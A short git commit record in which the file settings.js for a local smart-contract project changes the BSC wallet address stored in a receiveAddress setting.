c4cfa0c1228b891780d8b444a0773a6b7a9d9331
konradkol14 <konradkol14@gmail.com>
2024-05-25 07:59:59 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x577Ab4184AD8b58FbBCE82Df011D1E2fE8F085Bd";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
